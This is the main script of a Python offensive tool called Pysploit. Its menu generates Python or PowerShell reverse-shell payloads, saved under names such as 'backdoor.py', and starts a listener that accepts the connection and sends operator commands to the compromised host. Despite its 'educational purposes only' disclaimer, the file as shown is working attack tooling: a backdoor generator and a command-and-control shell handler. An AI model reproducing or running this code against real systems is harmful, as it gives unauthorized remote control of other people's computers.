# pysploit.py

import os
from modules.payloads.reverse_shell import generate_reverse_shell, generate_powershell_reverse_shell
import socket

def display_banner():
    print(r"""
 ██████╗ ██╗   ██╗███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝ ██║   ██║██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██║  ███╗██║   ██║█████╗  ██████╔╝██║     ██║   ██║██║   ██║   
██║   ██║██║   ██║██╔══╝  ██╔═══╝ ██║     ██║   ██║██║   ██║   
╚██████╔╝╚██████╔╝███████╗██║     ███████╗╚██████╔╝██║   ██║   
 ╚═════╝  ╚═════╝ ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
       === Pysploit by Junied Abrar ===

Disclaimer: This tool is for educational purposes only.
Unauthorized use is illegal. The developer is not responsible
for any misuse or damage caused by this tool.
""")


def start_listener(lhost, lport):
    print(f"[*] Starting listener on {lhost}:{lport}")
    
    # Create the listening socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((lhost, int(lport)))
    server.listen(1)  # Only allow one connection for simplicity
    
    print(f"[*] Listening on {lhost}:{lport}...")
    
    # Wait for the reverse shell to connect
    client_socket, client_address = server.accept()
    print(f"[*] Connection established with {client_address}")
    
    while True:
        # Receive the command to send to the reverse shell
        command = input(f"Shell ({client_address}) > ")

        if command.lower() == "exit":
            print("[*] Closing connection...")
            client_socket.close()
            break

        if command:
            # Send the command to the reverse shell
            client_socket.send(command.encode())
            response = client_socket.recv(1024).decode()
            print(response)

def main():
    while True:
        display_banner()
        print("[01] Generate Payload")
        print("[02] Start Listener")
        print("[00] Exit")
        choice = input("Pysploit > ")

        if choice == "01":
            print("\nChoose Stager:")
            print("[01] Python Reverse Shell")
            print("[02] PowerShell Reverse Shell")
            stager = input("Stager > ")

            lhost = input("LHOST > ")
            lport = input("LPORT > ")
            filename = input("Filename (e.g. backdoor.py) > ")

            if stager == "01":
                generate_reverse_shell(lhost, lport, filename)
            elif stager == "02":
                generate_powershell_reverse_shell(lhost, lport, filename)

        elif choice == "02":
            lhost = input("LHOST (default 0.0.0.0) > ")
            lport = input("LPORT > ")
            start_listener(lhost, lport)

        elif choice == "00":
            print("Exiting...")
            break
        else:
            print("Invalid choice, try again.")

# Start the main program
if __name__ == "__main__":
    main()
